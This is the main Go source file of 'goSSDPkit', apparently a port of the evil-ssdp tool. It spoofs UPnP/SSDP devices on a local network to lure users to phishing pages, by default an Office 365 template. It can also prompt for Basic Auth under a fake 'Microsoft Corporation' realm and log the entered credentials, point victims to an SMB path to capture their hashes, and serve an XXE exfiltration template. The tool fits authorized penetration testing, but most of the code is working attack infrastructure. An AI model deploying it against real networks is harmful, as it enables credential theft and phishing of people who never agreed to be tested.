package main

import (
	"context"
	"fmt"
	"net"
	"os"
	"os/signal"
	"path/filepath"
	"regexp"
	"runtime"
	"strconv"
	"strings"
	"syscall"

	"goSSDPkit/pkg/ssdp"
	"goSSDPkit/pkg/template"
	"goSSDPkit/pkg/upnp"
)

// Version information - set via ldflags during build
var (
	Version   = "dev"
	BuildTime = "unknown"
	GitCommit = "unknown"
)

const bannerTemplate = "\n\033[38;5;51m   ██████╗  ██████╗ ███████╗███████╗██████╗ ██████╗ ██╗  ██╗██╗████████╗\033[0m\n" +
	"\033[38;5;45m  ██╔════╝ ██╔═══██╗██╔════╝██╔════╝██╔══██╗██╔══██╗██║ ██╔╝██║╚══██╔══╝\033[0m\n" +
	"\033[38;5;39m  ██║  ███╗██║   ██║███████╗███████╗██║  ██║██████╔╝█████╔╝ ██║   ██║   \033[0m\n" +
	"\033[38;5;33m  ██║   ██║██║   ██║╚════██║╚════██║██║  ██║██╔═══╝ ██╔═██╗ ██║   ██║   \033[0m\n" +
	"\033[38;5;27m  ╚██████╔╝╚██████╔╝███████║███████║██████╔╝██║     ██║  ██╗██║   ██║   \033[0m\n" +
	"\033[38;5;21m   ╚═════╝  ╚═════╝ ╚══════╝╚══════╝╚═════╝ ╚═╝     ╚═╝  ╚═╝╚═╝   ╚═╝   \033[0m\n\n" +
	"\033[38;5;196m★\033[38;5;208m★\033[38;5;220m★ \033[38;5;46mGo SSDP Security Testing Kit \033[38;5;220m★\033[38;5;208m★\033[38;5;196m★\033[0m\n\n" +
	"\033[38;5;244mBased on evil-ssdp by initstring (github.com/initstring)\033[0m\n" +
	"\033[38;5;244mGo port by 3mrgnc3 (github.com/3mrgnc3)\033[0m\n"

// getBanner returns the banner with version information
func getBanner() string {
	versionInfo := fmt.Sprintf("\033[38;5;244mVersion: %s", Version)
	if GitCommit != "unknown" {
		versionInfo += fmt.Sprintf(" (%s)", GitCommit)
	}
	versionInfo += "\033[0m\n"
	
	return bannerTemplate + versionInfo
}

// Config holds all application configuration
type Config struct {
	Interface   string
	Port        int
	Template    string
	SMBServer   string
	BasicAuth   bool
	Realm       string
	RedirectURL string
	AnalyzeMode bool
}

func main() {
	fmt.Print(getBanner())

	// Parse command line arguments
	config, err := parseArgs()
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error parsing arguments: %v\n", err)
		os.Exit(1)
	}

	// Initialize logging
	upnp.InitLogger()

	// Get local IP from interface
	localIP, err := getIPFromInterface(config.Interface)
	if err != nil {
		upnp.Logger.Log("%sCould not get network interface info. Please check and try again.", ssdp.WarnBox)
		os.Exit(1)
	}

	// Set SMB server IP
	smbServer := setSMBServer(config.SMBServer, localIP)

	// Validate template directory
	templateDir := filepath.Join("templates", config.Template)
	if err := template.ValidateTemplateDir(templateDir); err != nil {
		upnp.Logger.Log("Sorry, that template directory does not exist or is invalid.")
		upnp.Logger.Log("Error: %v", err)
		upnp.Logger.Log("Please double-check and try again.")
		os.Exit(1)
	}

	// Create SSDP listener
	listener, err := ssdp.NewListener(localIP, config.Port, config.AnalyzeMode)
	if err != nil {
		upnp.Logger.Log("%sError creating SSDP listener: %v", ssdp.WarnBox, err)
		os.Exit(1)
	}

	// Create template manager
	templateData := template.TemplateData{
		LocalIP:     localIP,
		LocalPort:   config.Port,
		SMBServer:   smbServer,
		SessionUSN:  listener.GetSessionUSN(),
		RedirectURL: config.RedirectURL,
	}
	templateManager := template.NewManager(templateDir, templateData)

	// Create UPnP server
	upnpConfig := upnp.Config{
		LocalIP:     localIP,
		LocalPort:   config.Port,
		SMBServer:   smbServer,
		RedirectURL: config.RedirectURL,
		IsAuth:      config.BasicAuth,
		Realm:       config.Realm,
		SessionUSN:  listener.GetSessionUSN(),
	}
	server, err := upnp.NewServer(templateManager, upnpConfig)
	if err != nil {
		upnp.Logger.Log("%sError creating UPnP server: %v", ssdp.WarnBox, err)
		os.Exit(1)
	}

	// Print configuration details
	printDetails(config, localIP, smbServer)

	// Set up context for graceful shutdown
	ctx, cancel := context.WithCancel(context.Background())
	
	// Set up signal handling
	sigChan := make(chan os.Signal, 1)
	if runtime.GOOS == "windows" {
		signal.Notify(sigChan, os.Interrupt)
	} else {
		signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	}

	// Start SSDP listener in goroutine
	go func() {
		if err := listener.Listen(); err != nil {
			upnp.Logger.Log("%sSSDP listener error: %v", ssdp.WarnBox, err)
			cancel()
		}
	}()

	// Start HTTP server in goroutine
	go func() {
		address := fmt.Sprintf("%s:%d", localIP, config.Port)
		if err := server.Start(address); err != nil {
			upnp.Logger.Log("%sHTTP server error: %v", ssdp.WarnBox, err)
			cancel()
		}
	}()

	// Wait for shutdown signal
	select {
	case <-sigChan:
		upnp.Logger.Log("%sThanks for playing! Stopping threads and exiting...", ssdp.WarnBox)
	case <-ctx.Done():
		upnp.Logger.Log("%sShutting down due to error...", ssdp.WarnBox)
	}

	// Clean up
	listener.Close()
	server.Close()
}

// parseArgs parses and validates command line arguments
func parseArgs() (*Config, error) {
	var config Config
	var showVersion bool

	// Manual argument parsing to handle flags after positional arguments
	args := os.Args[1:]
	i := 0
	
	for i < len(args) {
		arg := args[i]
		
		switch arg {
		case "-h", "--help":
			printUsage()
			os.Exit(0)
		case "-version", "--version":
			showVersion = true
			i++
		case "-a", "--analyze":
			config.AnalyzeMode = true
			i++
		case "-b", "--basic":
			config.BasicAuth = true
			i++
		case "-p", "--port":
			if i+1 >= len(args) || strings.HasPrefix(args[i+1], "-") {
				return nil, fmt.Errorf("flag -p requires a value (port number)")
			}
			port, err := strconv.Atoi(args[i+1])
			if err != nil {
				return nil, fmt.Errorf("invalid port value: %s", args[i+1])
			}
			config.Port = port
			i += 2
		case "-t", "--template":
			if i+1 >= len(args) || strings.HasPrefix(args[i+1], "-") {
				return nil, fmt.Errorf("flag -t requires a value (template name)")
			}
			config.Template = args[i+1]
			i += 2
		case "-s", "--smb":
			if i+1 >= len(args) || strings.HasPrefix(args[i+1], "-") {
				return nil, fmt.Errorf("flag -s requires a value (SMB server IP)")
			}
			config.SMBServer = args[i+1]
			i += 2
		case "-r", "--realm":
			if i+1 >= len(args) || strings.HasPrefix(args[i+1], "-") {
				return nil, fmt.Errorf("flag -r requires a value (realm name)")
			}
			config.Realm = args[i+1]
			i += 2
		case "-u", "--url":
			if i+1 >= len(args) || strings.HasPrefix(args[i+1], "-") {
				return nil, fmt.Errorf("flag -u requires a value (URL)")
			}
			config.RedirectURL = args[i+1]
			i += 2
		case "-interface":
			if i+1 >= len(args) {
				return nil, fmt.Errorf("flag -interface requires a value")
			}
			config.Interface = args[i+1]
			i += 2
		default:
			// If it doesn't start with -, treat as interface (positional argument)
			if !strings.HasPrefix(arg, "-") && config.Interface == "" {
				config.Interface = arg
				i++
			} else {
				return nil, fmt.Errorf("unknown flag: %s", arg)
			}
		}
	}
	
	// Set defaults if not specified
	if config.Port == 0 {
		config.Port = 8888
	}
	if config.Template == "" {
		config.Template = "office365"
	}
	if config.Realm == "" {
		config.Realm = "Microsoft Corporation"
	}

	// Handle version flag
	if showVersion {
		fmt.Printf("goSSDPkit %s\n", Version)
		if GitCommit != "unknown" {
			fmt.Printf("Git commit: %s\n", GitCommit)
		}
		if BuildTime != "unknown" {
			fmt.Printf("Built: %s\n", BuildTime)
		}
		os.Exit(0)
	}

	if config.Interface == "" {
		return nil, fmt.Errorf("interface is required")
	}

	// Sanitize interface name (same as Python version)
	charWhitelist := regexp.MustCompile(`[^a-zA-Z0-9 ._-]`)
	config.Interface = charWhitelist.ReplaceAllString(config.Interface, "")

	return &config, nil
}

func printUsage() {
	fmt.Fprintf(os.Stderr, "usage: %s [-h] [-p PORT] [-t TEMPLATE] [-s SMB] [-b] [-r REALM]\n", os.Args[0])
	fmt.Fprintf(os.Stderr, "                    [-u URL] [-a]\n")
	fmt.Fprintf(os.Stderr, "                    interface\n\n")
	fmt.Fprintf(os.Stderr, "positional arguments:\n")
	fmt.Fprintf(os.Stderr, "  interface             Network interface to listen on.\n\n")
	fmt.Fprintf(os.Stderr, "optional arguments:\n")
	fmt.Fprintf(os.Stderr, "  -h, --help            show this help message and exit\n")
	fmt.Fprintf(os.Stderr, "  -p PORT, --port PORT  Port for HTTP server. Defaults to 8888.\n")
	fmt.Fprintf(os.Stderr, "  -t TEMPLATE, --template TEMPLATE\n")
	fmt.Fprintf(os.Stderr, "                        Name of a folder in the templates directory. Defaults\n")
	fmt.Fprintf(os.Stderr, "                        to \"office365\". This will determine xml and phishing\n")
	fmt.Fprintf(os.Stderr, "                        pages used.\n")
	fmt.Fprintf(os.Stderr, "  -s SMB, --smb SMB     IP address of your SMB server. Defalts to the primary\n")
	fmt.Fprintf(os.Stderr, "                        address of the \"interface\" provided.\n")
	fmt.Fprintf(os.Stderr, "  -b, --basic           Enable base64 authentication for templates and write\n")
	fmt.Fprintf(os.Stderr, "                        credentials to log file.\n")
	fmt.Fprintf(os.Stderr, "  -r REALM, --realm REALM\n")
	fmt.Fprintf(os.Stderr, "                        Realm when prompting target for authentication via\n")
	fmt.Fprintf(os.Stderr, "                        Basic Auth.\n")
	fmt.Fprintf(os.Stderr, "  -u URL, --url URL     Redirect to this URL. Works with templates that do a\n")
	fmt.Fprintf(os.Stderr, "                        POST for logon forms and with templates that include\n")
	fmt.Fprintf(os.Stderr, "                        the custom redirect JavaScript (see README for more\n")
	fmt.Fprintf(os.Stderr, "                        info).[example: -r https://google.com]\n")
	fmt.Fprintf(os.Stderr, "  -a, --analyze         Run in analyze mode. Will NOT respond to any SSDP\n")
	fmt.Fprintf(os.Stderr, "                        queries, but will still enable and run the web server\n")
	fmt.Fprintf(os.Stderr, "                        for testing.\n")
}

// getIPFromInterface gets the IP address from a network interface name
func getIPFromInterface(interfaceName string) (string, error) {
	// First try exact match
	iface, err := net.InterfaceByName(interfaceName)
	if err != nil {
		// On Windows, try to find interface by partial name match
		if runtime.GOOS == "windows" {
			interfaces, listErr := net.Interfaces()
			if listErr != nil {
				return "", fmt.Errorf("interface '%s' not found and failed to list interfaces: %w", interfaceName, listErr)
			}
			
			// Try to find interface with partial name match (case-insensitive)
			lowerName := strings.ToLower(interfaceName)
			for _, iface := range interfaces {
				ifaceLower := strings.ToLower(iface.Name)
				if strings.Contains(ifaceLower, lowerName) || strings.Contains(lowerName, ifaceLower) {
					// Found a potential match, try to get IP
					if ip, ipErr := getIPFromInterfaceStruct(iface); ipErr == nil {
						upnp.Logger.Log("%sUsing interface: %s (matched '%s')", ssdp.NoteBox, iface.Name, interfaceName)
						return ip, nil
					}
				}
			}
			return "", fmt.Errorf("interface not found: %s (tried exact match and partial matching)", interfaceName)
		}
		return "", fmt.Errorf("interface not found: %w", err)
	}

	return getIPFromInterfaceStruct(*iface)
}

// getIPFromInterfaceStruct gets IP from interface struct
func getIPFromInterfaceStruct(iface net.Interface) (string, error) {
	addrs, err := iface.Addrs()
	if err != nil {
		return "", fmt.Errorf("failed to get addresses for interface %s: %w", iface.Name, err)
	}

	for _, addr := range addrs {
		if ipNet, ok := addr.(*net.IPNet); ok && !ipNet.IP.IsLoopback() {
			if ipNet.IP.To4() != nil {
				return ipNet.IP.String(), nil
			}
		}
	}

	return "", fmt.Errorf("no IPv4 address found for interface %s", iface.Name)
}

// setSMBServer sets the SMB server IP address
func setSMBServer(smbArg, localIP string) string {
	if smbArg != "" {
		if net.ParseIP(smbArg) != nil {
			return smbArg
		}
		upnp.Logger.Log("%sSorry, that is not a valid IP address for your SMB server.", ssdp.WarnBox)
		os.Exit(1)
	}
	return localIP
}

// printDetails prints the configuration banner
func printDetails(config *Config, localIP, smbServer string) {
	devURL := fmt.Sprintf("http://%s:%d/ssdp/device-desc.xml", localIP, config.Port)
	srvURL := fmt.Sprintf("http://%s:%d/ssdp/service-desc.xml", localIP, config.Port)
	phishURL := fmt.Sprintf("http://%s:%d/ssdp/present.html", localIP, config.Port)
	exfilURL := fmt.Sprintf("http://%s:%d/ssdp/data.dtd", localIP, config.Port)
	smbURL := fmt.Sprintf("file://///%s/smb/hash.jpg", smbServer)
	templateDir := filepath.Join("templates", config.Template)

	upnp.Logger.LogRaw("\n")
	upnp.Logger.Log("########################################")
	upnp.Logger.Log("%sEVIL TEMPLATE:           %s", ssdp.OkBox, templateDir)
	upnp.Logger.Log("%sMSEARCH LISTENER:        %s", ssdp.OkBox, config.Interface)
	upnp.Logger.Log("%sDEVICE DESCRIPTOR:       %s", ssdp.OkBox, devURL)
	upnp.Logger.Log("%sSERVICE DESCRIPTOR:      %s", ssdp.OkBox, srvURL)
	upnp.Logger.Log("%sPHISHING PAGE:           %s", ssdp.OkBox, phishURL)

	if config.RedirectURL != "" {
		upnp.Logger.Log("%sREDIRECT URL:            %s", ssdp.OkBox, config.RedirectURL)
	}

	if config.BasicAuth {
		upnp.Logger.Log("%sAUTH ENABLED, REALM:     %s", ssdp.OkBox, config.Realm)
	}

	if strings.Contains(templateDir, "xxe-exfil") {
		upnp.Logger.Log("%sEXFIL PAGE:              %s", ssdp.OkBox, exfilURL)
	} else {
		upnp.Logger.Log("%sSMB POINTER:             %s", ssdp.OkBox, smbURL)
	}

	if config.AnalyzeMode {
		upnp.Logger.Log("%sANALYZE MODE:            ENABLED", ssdp.WarnBox)
	}

	upnp.Logger.Log("########################################")
	upnp.Logger.LogRaw("\n")
}